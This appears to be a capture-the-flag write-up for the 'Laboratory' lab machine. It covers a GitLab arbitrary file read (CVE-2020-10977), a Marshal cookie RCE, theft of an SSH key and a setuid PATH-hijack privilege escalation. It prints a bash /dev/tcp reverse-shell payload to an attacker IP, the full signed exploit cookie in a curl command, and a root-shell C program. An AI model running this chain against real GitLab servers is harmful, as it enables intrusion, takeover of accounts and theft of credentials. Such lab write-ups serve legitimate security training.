@@ -1,0 +1,171 @@
+                 Laboratory
+
+                                                               16th April 2021 / Document No D21.100.114
+                                                               Prepared By: arkanoid
+                                                               Machine Author(s): 0xc45
+                                                               Difficulty: Easy
+                                                               Classification: Official
+
+Synopsis
+
+Laboratory is an easy difficulty Linux machine that features a GitLab web application in a docker.
+This application is found to suffer from an arbitrary read file vulnerability, which is leveraged
+along with a remote command execution to gain a foothold on a docker instance. By giving
+administration permissions to our GitLab user it is possible to steal private ssh-keys and get a
+foothold on the box. Post-exploitation enumeration reveals that the system Laboratory has an
+executable program set as setuid. This is leveraged to gain a root shell on the server.
+
+Skills Required
+
+      Enumeration
+      Basic Rails Knowledge
+      Basic Docker Knowledge
+
+Skills Learned
+
+      Arbitrary read file
+      Marshal cookie attack
+      SUID Exploitation
+
+Enumeration
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.216 | grep ^[0-9] | cut -d '/' -f
+   1 | tr '\n' ',' | sed s/,$//)
+   nmap -sC -sV -p$ports 10.10.10.216
+
+Nmap output reveals that the target server has ports 22 (OpenSSH), 80 (Apache httpd) and 443
+(Apache SSL httpd) open. Let's browse to port 80. We notice that we are being redirect to
+laboratory.htb . We need to add it to the /etc/hosts file. We observe that nmap output
+discloses another hostname i.e. git.laboratory.htb which we also need to add it to our hosts
+file. Let's visit now the laboratory.htb .
+The web server is hosting a website of the security services company Laboratory. We can spot
+three (3) users. One of them is the CEO of the company, Mr. Dexter. Let's visit now
+git.laboratory.htb .
+
+A community edition of gitlab can be found which requires valid credentials to access it.
+
+Foothold
+
+It is possible to register a user. Note though that for a successful registration it requires a valid
+domain such as laboratory.htb .
+
+By navigating a little bit around the application we can spot under the help menu the exact
+version of gitlab (12.8.1).
+By searching on the internet for any possible vulnerabilities, we come across an arbitrary read file
+vulnerability assigned with CVE-2020-10977 and some exploits related to versions <=12.9.0.
+According to the initial exploitation report for the arbitrary read vulnerability the first step is to
+create two new projects.
+
+Then add an issue with the following directory traversal in the description
+   ![a]
+   (/uploads/11111111111111111111111111111111/../../../../../../../../<SNIP>/etc/pa
+   sswd)
+Then move this issue to the second project and then it is possible to download the specified file in
+our case /etc/passwd .
+
+There are also exploits developed such as this one that can automate completely the process.
+Let's give it a try.
+
+   python3 cve_2020_10977.py https://git.laboratory.htb arkanoid Password1!
+
+The exploit works successfully and now we can read files from the system. But it is not possible to
+get a shell by this vulnerability only. While reading further the aforementioned advisory we notice
+in comments that we can perform a remote command execution also. This can be done by getting
+the secret_key_base from /opt/gitlab/embedded/service/gitlab-
+rails/config/secrets.yml . So by using the same exploit is possible to grub it. Then we can use
+the experimentation_subject_id cookie with a Marshalled payload as it is best described here
+in order to achive command execution.
+First we need to setup our own gitlab instance so we install it by downloading the correct version
+from here. We also install the proper repository with the assistance of this script before
+attempting to install the deb package. In order to use the console we need to first reconfigure it
+by executing the following command.
+
+   gitlab-ctl reconfigure
+
+Next we replace the value of secret_key_base at the file
+opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml with the one we grabbed
+from the Laboratory. Then we restart and initiate the console.
+
+   gitlab-ctl restart
+   gitlab-rails console
+
+Now it's time to perform our exploit with the following:
+
+   request = ActionDispatch::Request.new(Rails.application.env_config)
+   request.env["action_dispatch.cookies_serializer"] = :marshal
+   cookies = request.cookie_jar
+   erb = ERB.new("<%= `bash -c 'bash -i>& /dev/tcp/10.10.14.22/4444 0>&1'` %>")
+   depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb,
+   :result, "@result", ActiveSupport::Deprecation.new)
+   cookies.signed[:cookie] = depr
+   puts cookies[:cookie]
+
+Finally we send our cookie to the server while listening with netcat at our local machine for
+reverse shell.
+
+   curl -vvv 'https://git.laboratory.htb/users/sign_in' -k -b
+   "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVj
+   YXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJ
+   QHNyY0kidCNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdi
+   YXNoIC1pPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjIvNDQ0NCAwPiYxJ2AgKS50b19zKTsgX2VyYm91dAY6
+   BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxl
+   bmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXBy
+   ZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=-
+   -8fdb57c5b65cef79b38c842cc0a42570ff756636"
+
+and we successfully get our shell as user git .
+It seems that we are located inside a docker so we need a way to find to escape from it. It is
+possible to exploit our initial access on GitLab by granting escalated permissions to our registered
+user and becoming administrator.
+
+   gitlab-rails console
+   user = User.find._by_username 'arkanoid'
+   user.admin = TRUE
+   user.save!
+After refreshing our browser with our current session we observe that indeed our account now
+has administrator privileges and it is possible to view Dexter's projects.
+
+By navigating inside Dexter's SecureDocker project we can locate his private ssh key in file
+id_rsa .
+We copy the ssh key to our local machine and we logged in as user dexter
+   chmod 600 id_rsa
+   ssh -i id_rsa dexter@10.10.10.216
+
+Finally we can grab user.txt flag.
+Note: It seems now that there is also a Metasploit module
+exploit/multi/http/gitlab_file_read_rce that can automate the whole exploitation process.
+
+Privilege Escalation
+
+By performing basic enumeration steps by using a script like Linpeas is possible to spot an suid
+bit set file /usr/local/bin/docker-security . We download the file for further analysis locally.
+We use ltrace to spot that it executes chmod using a relative path.
+
+   ltrace ./docker-security
+We can add in our path a custom chmod file that is going to be executed as root. Let's create our
+chmod file by compiling the following C program that it's going to give us a root shell.
+
+   #include <stdio.h>
+   #include <unistd.h>
+   #include <sys/types.h>
+   #include <stdlib.h>
+
+   int main(){
+                 setuid(getuid());
+                 system("/bin/bash");
+                 return 0;
+
+   }
+
+We compile our program locally and then upload it to system at /tmp .
+
+   gcc -o chmod chmod.c
+   scp -i ./id_rsa chmod dexter@10.10.10.216:/tmp
+
+Then from our initial shell we add to our path the directory of our compiled program and we
+execute.
+
+   export PATH=/tmp/:$PATH
+   /usr/local/bin/docker-security
+
+We get our root shell and now we can grab the flag root.txt
+
